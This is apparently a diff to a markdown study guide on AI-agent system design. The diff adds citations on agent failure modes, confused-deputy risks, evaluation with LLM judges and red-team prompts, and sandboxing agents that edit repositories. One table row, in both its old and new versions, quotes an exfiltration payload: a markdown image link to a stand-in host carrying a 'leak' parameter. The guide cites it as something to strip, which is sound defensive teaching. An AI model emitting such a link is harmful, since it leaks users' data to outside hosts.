@@ -30,7 +30,7 @@ In system design interviews, separate failures into **three distinct fault domai
 | :--- | :--- | :--- | :--- |
 | **1. Model & Loop Failures** | **Wrong-tool selection**, **premature completion** (claims success without calling write tool), or **repeated identical tool loops**. | Step trace lacks required mutation span; canonical hash `H(tool, args)` repeats `>= 2` times. | Scope toolset to `<= 15` clear schemas; verify expected post-condition state before closing task; abort duplicate call hashes. |
 | **2. Tool & Infra Failures** | **Partial mutation** (Step 1 charges card, Step 2 order creation times out), **`429` rate limits**, or **hostile/oversized tool payloads**. | Uncommitted step state in run journal; payload exceeds `max_bytes` or schema check. | Enforce **idempotency keys** + **compensating Saga rollbacks** (`void_authorization`); validate & truncate tool outputs at the host boundary. |
-| **3. Security & Confused Deputy** | **Confused Deputy** (agent uses its own broad service-account key on behalf of an unprivileged user) or **data exfiltration via URLs/markdown images**. | Audit log shows resource tenant/ACL mismatch; outbound URL domain not in allow-list. | Exchange caller's token via **OAuth On-Behalf-Of (OBO)** (never shared admin keys!); strip external markdown image rendering (`![](https://evil.com?leak=...)`) in the UI. |
+| **3. Security & Confused Deputy** | **Confused Deputy** (agent uses its own broad service-account key on behalf of an unprivileged user) or **data exfiltration via URLs/markdown images** [5]. | Audit log shows resource tenant/ACL mismatch; outbound URL domain not in allow-list. | Exchange caller's token via **OAuth On-Behalf-Of (OBO, RFC 8693)** [4] (never shared admin keys!); strip external markdown image rendering (`![](https://evil.com?leak=...)`) in the UI [5]. |
 
 :::
 
@@ -55,8 +55,8 @@ Because running a judge LLM takes `1–2 seconds` and doubles token cost. By pub
 Never rely on a single uncalibrated LLM-as-Judge score:
 1. **Combine Three Evaluators:**
    - **Code Assertions (100% deterministic):** Schema validity, forbidden-tool absence, citation ID existence, cost/step bounds.
-   - **Calibrated LLM Judge:** Graded on binary `PASS/FAIL` criteria and periodically benchmarked against **100 human-labeled gold traces** (requiring Cohen's `κ >= 0.80` agreement with domain experts) [3].
-   - **Adversarial Regression Slice (`50+` red-team prompts):** Indirect prompt injections inside mock emails/READMEs, jailbreaks, and cross-tenant ID probes—requiring a strict **`0%` attack success rate** to merge.
+   - **Calibrated LLM Judge:** Graded on binary `PASS/FAIL` criteria and periodically benchmarked against **100 human-labeled gold traces** (requiring Cohen's `κ >= 0.80` agreement with domain experts) [3, 6].
+   - **Adversarial Regression Slice (`50+` red-team prompts):** Indirect prompt injections inside mock emails/READMEs, jailbreaks, and cross-tenant ID probes—requiring a strict **`0%` attack success rate** to merge [5].
 2. **Design Drill — How Do You Let an Agent Modify a Git Repository Safely?**
    - **Isolation:** Clone into an ephemeral container/worktree with **zero production secrets** and no push credentials to `main`.
    - **Scoped Tools:** Expose typed tools (`read_file`, `search_code`, `apply_patch`, `run_targeted_tests`) with path canonicalization blocking `.git/hooks`, `.github/workflows`, and `..` traversal.
@@ -94,3 +94,6 @@ Never rely on a single uncalibrated LLM-as-Judge score:
 - **[1]** Anthropic Engineering, *Building Effective Agents* (2024) — [anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents)
 - **[2]** Chip Huyen, *AI Engineering: Building Applications with Foundation Models* (O'Reilly, 2025) — Evaluation, Guardrails & Agent Loops
 - **[3]** Hamel Husain & Eugene Yan, *Your AI Product Needs Evals* — [applied-llms.org](https://applied-llms.org/)
+- **[4]** IETF RFC 8693, *OAuth 2.0 Token Exchange (On-Behalf-Of Delegation & Audience Scoping)* — [datatracker.ietf.org/doc/html/rfc8693](https://datatracker.ietf.org/doc/html/rfc8693)
+- **[5]** OWASP GenAI Security Project, *OWASP Top 10 for Large Language Model Applications (Prompt Injection & Excessive Agency)* — [genai.owasp.org/llm-top-10](https://genai.owasp.org/llm-top-10/)
+- **[6]** Lianmin Zheng et al., *Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena* (NeurIPS 2023) — [arxiv.org/abs/2306.05685](https://arxiv.org/abs/2306.05685)
